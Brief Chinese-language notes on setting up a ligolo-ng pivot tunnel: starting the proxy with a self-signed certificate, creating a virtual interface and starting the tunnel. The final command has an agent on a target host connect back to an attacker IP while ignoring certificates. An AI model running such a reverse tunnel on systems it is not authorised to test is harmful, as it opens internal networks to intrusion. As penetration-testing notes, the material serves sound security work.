# proxy端（服务端）

# 启动 proxy

```bash
sudo ./proxy -selfcert #用自签名的证书
```

```bash
session #开启会话
```

在 `ligolo-ng` 的命令行里，先用 `interface_create` 命令创建一个虚拟网卡，然后再用 `tunnel_start` 启动隧道。

text

# 创建一个名为 pp 的虚拟网卡

```bash
ligolo-ng » interface_create --name "pp"
```

```bash
tunnel_start --tun 网卡名字
```

```bash
iflist #查看网卡信息
```

# 然后启动隧道

[Agent : root@dcc9fff32fcd] » tunnel_start --tun pp

# agent端（客户端）

# 启动 agent 连接本地 proxy

```bash
./agent -connect 攻击机ip:端口 -ignore-cert --retry #忽略证书和断开重连ba
```
